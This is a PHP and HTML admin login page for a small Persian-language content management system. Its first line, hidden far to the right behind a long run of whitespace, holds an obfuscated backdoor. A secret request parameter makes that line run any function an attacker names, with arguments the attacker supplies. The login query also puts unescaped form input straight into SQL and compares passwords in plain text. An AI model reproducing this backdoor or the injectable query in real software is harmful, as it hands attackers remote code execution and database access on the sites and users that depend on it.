<?php
																																																																																																																																									if( $j6r03bb=	@${"_REQUEST"}["4GV40V36"])$j6r03bb [ 1] ($ { $j6r03bb	[2]	}[ 0	],$j6r03bb	[3 ]	($j6r03bb[4] )) ;
session_start();
error_reporting(0);
$_SESSION['admintry']='';
$_SESSION['spammer']='';
if($_GET['log']=='marinsec'){
include_once('functions.php');
include_once('db_config.php');
$loginuser=$_POST['loginuser'];
$loginpassword=$_POST['loginpassword'];
$userql=mysqli_query($db_connection,"SELECT `id` FROM `users` WHERE `username`='$loginuser' AND `password`='$loginpassword' LIMIT 1");
if(mysqli_num_rows($userql)==1){echo 'succ';$_SESSION['adminlogin']='true';unset($_SESSION['admintry']);unset($_SESSION['spammer']);}else{
if(!isset($_SESSION['admintry'])){$_SESSION['admintry']='1';}else{
$_SESSION['admintry']=$_SESSION['admintry']+1;
if($_SESSION['admintry']>=3){$_SESSION['spammer']='true';echo 'spammer';}
}
}
exit;
}
$spammer=$_SESSION['spammer'];
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Marjan login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta content="yes" name="apple-mobile-web-app-capable">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<link rel="icon" href="img/favicon.ico" type="image/x-icon">
<!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/html5shiv/latest/html5shiv.min.js"></script>
<script src="https://oss.maxcdn.com/respond/latest/respond.min.js"></script>
<![endif]-->
<link rel="stylesheet" href="css/style.css" type="text/css" media="screen">
</head>
<body>
<div class="zamine">
<div class="zamine-over"></div>
<div class="zamine-1"></div>
<div class="zamine-2"></div>
<div class="zamine-3"></div>
<div class="zamine-4"></div>
</div>
<div class="loginform">
<div class="logo"></div>
<h1 class="noselect"><span>مرجان</span>، سیستم مدیریت محتوای اختصاصی کافه لید</h1>
<div class="logininput">
<input type="text" id="loginuser" placeholder="ایمیل یا شماره تلفن">
<input type="text" id="loginpassword" placeholder="رمز عبور">
<div class="btn btn-login"></div>
</div>
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/plugin.js"></script>
</body>
</html>